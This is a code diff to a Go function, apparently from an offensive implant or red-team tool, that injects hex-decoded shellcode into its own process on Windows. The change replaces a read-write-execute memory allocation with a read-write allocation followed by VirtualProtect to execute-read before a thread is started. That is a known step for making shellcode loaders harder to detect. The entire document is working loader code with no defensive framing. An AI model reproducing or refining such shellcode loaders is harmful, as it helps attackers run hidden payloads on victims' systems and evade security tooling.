@@ -20,13 +20,20 @@ func SelfInject(shellcodeHex string) string {
 		return "[!] Failed to decode hex: " + err.Error()
 	}
 
-	executableMemory, err := windows.VirtualAlloc(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+	executableMemory, err := windows.VirtualAlloc(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if err != nil {
-		return "[!] Failed to allocate executable memory: " + err.Error()
+		return "[!] Failed to allocate memory: " + err.Error()
 	}
 
 	// Copy the shellcode into our assigned region of RWX memory
 	WriteMemory(shellcode, executableMemory)
+
+	var oldfperms uint32
+	// Mark shellcode as executable
+	err = windows.VirtualProtect(executableMemory, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldfperms)
+	if err != nil {
+		return "[!] Failed to change protections on memory: " + err.Error()
+	}
 
 	var threadHandle windows.Handle
 
